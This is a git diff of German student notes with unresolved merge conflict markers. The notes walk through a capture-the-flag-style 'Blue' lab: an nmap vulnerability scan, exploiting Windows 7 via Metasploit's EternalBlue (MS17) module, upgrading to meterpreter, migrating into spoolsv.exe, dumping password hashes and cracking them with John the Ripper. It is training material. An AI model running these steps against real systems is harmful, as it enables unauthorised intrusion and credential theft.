@@ -77,9 +77,105 @@ nmap --script vuln -p 135,139,445 10.10.211.133 | tee nmap-vuln
 
 # Nachmittag
 
+<<<<<<< HEAD
 ## Englisch
 
 ## Vuln Scan
 ```
 nmap -sV -sC --script vuln -oN blue.nmap 10.10.122.88
 ```
+=======
+# Einheit am Nachmittag
+## Bluebox Windows 7 Hacking mit Tutorial
+---
+## Scan durchführen
+Windows 7 wird nach Schwachstellen (Vulns) gescannt.
+```
+nmap -sV -sC --script vuln blue.nmap 10.10.122.88
+```
+## Arbeiten mit msfconsole
+Zum arbeiten mit msfconsole muss das Tool in Kali Linux gestartet werden.
+```
+msfconsole
+```
+
+# Hier muss noch protokolliert werden.
+1. nmap -sV -sC --script vuln -oN blue.nmap 10.10.137.78
+2. msfconsole
+3. search ms17
+4. search eternal
+5. use 3 
+6. show options
+7. set rhosts 10.10.73.63
+=> remote host (target)
+8. run 
+9.C:\Windows\system32>
+Optional
+set rhots 10.10.201.164
+run
+exploit
+show options
+set LPORT 4445
+
+## Meterpreter für Windows verwenden
+Das Arbeiten auf einer Windows Bash wird mit einem shell_to_meterpreter vereinfacht. Dies muss man mit dem Befehl festlegen.
+```
+use post/multi/manage/shell_to_meterpreter
+```
+
+## Optionen anzeigen
+Nun kann man über den Meterpreter Informationen zum angegriffenen Netzwerk anzeigen lassen. 
+```
+show options
+```
+## Session festlegen auf System
+Um nun das angegriffene System laufen zu lassen, muss vorher eine Session darauf festgelegt werden.
+In unserem Fall wird die id des Systems als Parameter mitgegeben. 
+```
+set session 1
+```
+
+## Session starten
+Die auf das System bezogene Session kann nun gestartet werden. 
+```
+run 
+```
+1. session 
+2. sessions 
+=> wir sollten jetzt eine 2 Session haben. 
+7. sessions -i 2
+=> Startet eine Interaktion 
+8. getuid
+=> NT AUTHORITIY\SYSTEM
+9. shell
+10. whoami
+11. strg + z
+12. ps
+## Rechte testen
+Der Prozess spoolsv.exe hat die höchste Berechtigung im System, und kann nur von Benutzern mit gleichen Rechten verändert werden. 
+```
+=> spoolsv.exe, hängt sich an diesen Prozessor, x64, NT AUTHORITY\SYSTEM
+```
+13. migrate (Prozessid)
+
+
+14. getuid
+
+## Passwörter ausgeben
+Mit dem Befehl hashdump können in Kali Linux alle Passwörter als Hashwert ausgegeben werden. Diese können später mit john the ripper entschlüsselt werden. 
+```
+hashdump
+```
+## Passwörter kopieren
+Nun müssen wir den Key des Benutzers auf unsere Maschine kopieren (ein zweites Terminal reicht in diesem Fall). Die Ausgabe muss dann in ein Hashfile gepiped werden. 
+```
+=> copy key vom john
+16. echo "john"
+```
+
+## Entschlüsseln mit John The Ripper
+Mit dem Kali Tool John The Ripper kann das Passwort nun entschlüsselt werden. Hierbei muss das Passwortformat "NT" mitgegeben werden. Um den Vorgang zu beschleunigen wird eine Wörterliste mitgegeben. 
+```
+john jon.hash --format=NT --wordlist=/opt/rockyou.txt
+```
+>>>>>>> 0fb8340aa0f6773e183e949ddb77aa34bc945962
